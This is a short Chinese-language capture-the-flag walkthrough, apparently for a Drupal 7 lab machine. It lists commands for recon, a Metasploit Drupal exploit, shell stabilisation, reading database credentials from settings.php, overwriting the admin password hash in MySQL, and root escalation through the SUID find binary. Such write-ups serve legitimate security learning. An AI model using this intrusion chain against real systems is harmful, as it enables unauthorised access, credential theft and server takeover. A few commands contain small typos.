~~~apl
1. 通过nmap扫描版本详细信息 发现了 CMS的一个版本为 Drupal 7   并访问web网站  使用whatweb dirsearch 等进行信息收集 
2. 使用MSF 查询 search  Drupal 7  查询后发现漏洞信息   # 使用 2018的payload  设置参数后 运行后 等待上线即可
3. python -c "import pty;pty.spawn('/bin/bash')"   # 使用python调取pty方式   获取稳定shell
4. ls查询文件  cat 查看 flag1.txt的内容  #  提示查询一下 CMS的配置文件 --- 可以去搜索引擎去搜索相关的配置文件 发现是setting.php
5. cat 'find / -name setting.php'  #  搜索名字为 setting.php的配置文件   配置文件发现了数据库  可以尝试数据库登录
6. mysql -uUSERNAME -p PASSWORD  #登录数据库   登录后进行数据库操作 查询表格 发现admin的账户和密码
7. 置换drupal密码     http://drupalchina.cn/node/2128  #  有置换方法
   7.1 或者可以进入  script文件夹下面发现相关的配置文件   # Drupal 7 的配置工具包
8. php script/password-hash.sh 123456 # 123456 是生成的新的密码 
9. update drupaldb.users set pass="上一步生成的哈希值" where name='admin';  # 重新进入数据库 替换掉数据库中的之前的 admin 的 密码 更新完成后 可以重新核验一下是否 替换成功   替换成功后 退出  
10. 回到web页面进行登录  进入后 查找 flag3  #  查看信息得到信息   需要使用SUID进行提权
11. find / -user root -perm -4000 -print 2>/dev/null  # 找到一个find文件  尝试使用find提权
12. touch filename  # 创建文件
13. find filename -exec "bin/sh" \;  # 提权   whoami  id  查看 提权成功
~~~



